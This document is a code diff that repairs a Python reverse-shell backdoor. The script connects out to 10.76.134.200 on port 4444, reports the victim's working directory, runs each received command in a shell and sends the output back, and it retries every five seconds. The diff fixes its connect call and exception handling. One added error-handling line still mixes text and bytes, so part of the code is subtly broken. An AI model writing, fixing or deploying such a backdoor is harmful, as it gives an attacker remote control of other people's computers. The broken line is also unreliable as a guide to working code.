@@ -12,7 +12,7 @@ def connect():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     while True:
         try:
-            s.connect("192.168.64.2", 4444) # Test whether it connects
+            s.connect(('10.76.134.200', 4444)) # Test whether it connects
             s.send(str.encode("[!] User Detected: " + os.getcwd() + ": "))
     
             while True:
@@ -23,7 +23,7 @@ def connect():
                         os.chdir(usrcmd[3:].strip()) # Changes directory in the shell
                         continue
                     except OSError as e:
-                        s.send("Error: " + str.encode(e.strerror) + "\n")
+                        s.send(str.encode("Error: " + str.encode(e.strerror) + "\n"))
                         continue
                 proc = subprocess.Popen(data.decode('utf-8'), shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
                 proc.stdout, proc.stderr = proc.communicate()
@@ -35,9 +35,13 @@ def connect():
                     break
 
             s.close()
-        except socket.error():
+        except socket.error:
+            print("Is not connecting")
             time.sleep(5) # Wait 5 seconds and attempt reconnecting
+
 
 
 if __name__ == "__main__":
     connect()
+
+
